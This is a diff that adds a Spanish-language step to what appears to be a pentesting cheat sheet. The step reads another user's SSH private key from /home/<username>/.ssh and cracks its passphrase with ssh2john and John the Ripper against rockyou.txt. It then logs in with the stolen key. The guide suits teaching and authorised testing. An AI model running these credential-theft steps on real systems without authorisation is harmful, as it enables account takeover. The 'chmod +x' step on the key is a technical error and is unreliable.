@@ -100,6 +100,33 @@
    ssh -oHostKeyAlgorithms=+ssh-rsa user@<TARGET_IP>
    ```
 
+2. Realizar un conexión remota mendiante id_rsa
+
+   Primer ver si se puede ver el archivo ocult id_rsa de la ruta del otro usuario
+   ```bash
+   ls /home/<username>/.ssh
+   ```
+   Si se puede ver, copiar el contenido de id_rsa en un archivo de la maquina del pentester
+   ```bash
+   cat id_rsa 
+   ```
+   Dar permiso de ejecución.
+   ```bash
+   chmod +x id_rsa
+   ```
+   Obtener el hash del fichero id_rsa usando **ssh2john**
+   ```bash
+   /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+   ```
+   Realizar fuerza bruta al hash obtenido del fichero id_rsa.hash usando **John The Riper**
+   ```bash
+   sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+   ```
+   Finalmente conectarse de esta forma y le solicitara ingresar la contraseña para la clave 'id_rsa'.
+   ```bash
+   sudo ssh -i id_rsa <username>@<TARGET_IP>
+   ```
+
 ## NSF
 
 1. Montar NFS compartidos
